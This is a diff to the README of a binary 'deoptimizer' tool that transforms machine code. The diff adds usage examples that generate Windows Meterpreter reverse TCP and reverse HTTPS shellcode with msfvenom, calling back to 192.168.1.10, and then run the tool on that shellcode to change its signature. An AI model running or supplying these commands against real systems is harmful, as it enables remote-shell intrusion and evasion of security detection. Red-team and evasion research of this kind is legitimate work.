@@ -73,7 +73,7 @@ Options:
       --syntax <SYNTAX>                 assembler formatter syntax (nasm/masm/intel/gas) [default: keystone]
   -b, --bitness <BITNESS>               bitness of the binary file (16/32/64) [default: 64]
   -A, --addr <ADDR>                     start address in hexadecimal form [default: 0x0000000000000000]
-      --skip-offsets <SKIP_OFFSETS>...  File offset range for not deoptimizing (eg: 0-10 for skipping first ten bytes)
+      --skip-offsets <SKIP_OFFSETS>...  File offset range for skipping deoptimization (eg: 0-10 for skipping first ten bytes)
   -c, --cycle <CYCLE>                   total number of deoptimization cycles [default: 1]
   -F, --freq <FREQ>                     deoptimization frequency [default: 0.5]
       --transforms <TRANSFORMS>         allowed transform routines (ap/li/lp/om/rs) [default: ap,li,lp,om,rs]
@@ -84,13 +84,34 @@ Options:
   -V, --version                         Print version
 ```
 
-### Currently Supported Architectures
+#### Examples
+
+- Generate and de-optimize a 64 bit Metasploit reverse TCP shellcode
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o shellcode 
+deoptimizer -a x86 -b 64 -F 1 -f /tmp/shellcode
+```
+- Generate and de-optimize a 64 bit Metasploit reverse HTTP(S) shellcode
+
+> [!WARNING]  
+> Some shellcodes may cointain string values that needs to be skipped! In such cases the string offsets needs to be specified using the `--skip-offsets` parameter.
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=8080 -o shellcode 
+deoptimizer -a x86 -b 64 -F 1 --skip-offsets 275-287 324-574  -f /tmp/shellcode
+```
+
+## Currently Supported Architectures
+
+- ✅ `Supported`
+- 🚧 `In progress`
+- ❌ `Unsupported`
 
 |  **Architecture** | **32** | **64** |
 |:-----------------:|:------:|:------:|
 |      **x86**      |   ✅   |   ✅   |
 |      **ARM**      |   ❌   |   🚧   |
-|     **RISC5**     |   ❌   |   🚧   |
+|     **RISCV**     |   ❌   |   🚧   |
 
 ## TO DO 
 - [ ] PE file support.
